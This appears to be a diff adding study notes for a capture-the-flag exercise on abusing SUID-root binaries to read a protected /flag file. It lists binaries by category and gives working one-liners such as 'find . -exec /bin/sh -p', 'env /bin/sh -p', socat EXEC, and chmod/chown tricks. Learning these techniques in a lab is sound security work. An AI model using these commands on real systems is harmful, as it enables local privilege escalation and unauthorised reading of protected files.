@@ -1,0 +1,80 @@
+All commands whose suid bit is already set
+-rwsr-xr-x 1 root root
+
+__Lets u directly read the flag!
+cat
+more 
+less
+tail
+head
+sort
+
+____Shows you that an over-privileged editor is a very powerful tool!
+vim
+emacs
+nano
+
+____Requires you to understand their output to derive the flag from it!
+rev
+hd
+od
+xxd
+base32
+base64
+split
+
+___Forces you to understand different archive formats!
+gzip
+bzip2
+zip
+tar
+ar
+cpio
+genisoimage
+
+___Enables you to read flags by making them execute other commands!
+env          env /bin/sh -p
+find         find . -exec /bin/sh -p \;
+make         make a file containing /bin/sh p
+nice         nice /bin/sh -p
+timeout      timeout 100 /bin/sh -p
+stdbuff      stdbuf -o0 /bin/sh -p
+setarch      setarch $(uname -m) /bin/sh -p
+watch        watch -x /usr/bin/cat /flag
+socat        socat - EXEC:'/bin/cat /flag'
+
+___Requires some light programming to read the flag.!
+whiptail     whiptail --textbox /flag 20 70
+awk          awk '{ print }' /flag
+sed          sed -n 'p' /flag
+ed           ed /flag  after that-> ,p
+
+___Lets you get the flag by doing tricks with permissions!
+chown       chown $(whoami) /flag
+chmod       chmod a+x /flag 
+cp          cp /flag theflag
+mv
+
+___Lets you read the flag because they let you program anything!
+perl
+python
+ruby
+bash
+
+___Just straight up wasn't designed to let you read files!
+date
+dmesg
+wc
+gcc
+as
+wget
+ssh-keygen
+
+
+
+
+
+
+
+
+
